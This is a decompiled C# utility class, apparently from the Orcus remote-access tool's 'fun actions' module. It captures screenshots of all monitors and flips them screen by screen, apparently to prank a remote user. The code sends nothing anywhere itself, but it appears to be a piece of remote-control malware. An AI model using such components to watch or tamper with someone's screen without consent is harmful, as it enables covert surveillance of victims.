using System;
using System.Drawing;
using System.Windows.Forms;

namespace Orcus.Commands.FunActions;

internal class ImageUtilities
{
	public static Bitmap TakeScreenshot()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		Bitmap val = new Bitmap(SystemInformation.get_VirtualScreen().Width, SystemInformation.get_VirtualScreen().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(SystemInformation.get_VirtualScreen().X, SystemInformation.get_VirtualScreen().Y, 0, 0, ((Image)val).get_Size(), (CopyPixelOperation)13369376);
			return val;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public static Bitmap TakeFullScreenshot()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		int left = SystemInformation.get_VirtualScreen().Left;
		int top = SystemInformation.get_VirtualScreen().Top;
		int width = SystemInformation.get_VirtualScreen().Width;
		int height = SystemInformation.get_VirtualScreen().Height;
		Bitmap val = new Bitmap(width, height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(left, top, 0, 0, ((Image)val).get_Size());
			return val;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public static Bitmap RotateScreenshotScreenByScreen(Bitmap image)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		Bitmap val = new Bitmap(((Image)image).get_Width(), ((Image)image).get_Height());
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			Screen[] allScreens = Screen.get_AllScreens();
			foreach (Screen val3 in allScreens)
			{
				Bitmap val4 = image.Clone(val3.get_Bounds(), ((Image)image).get_PixelFormat());
				((Image)val4).RotateFlip((RotateFlipType)2);
				val2.DrawImage((Image)(object)val4, new Point(val3.get_WorkingArea().X, val3.get_WorkingArea().Y));
				((Image)val4).Dispose();
			}
			return val;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}
}
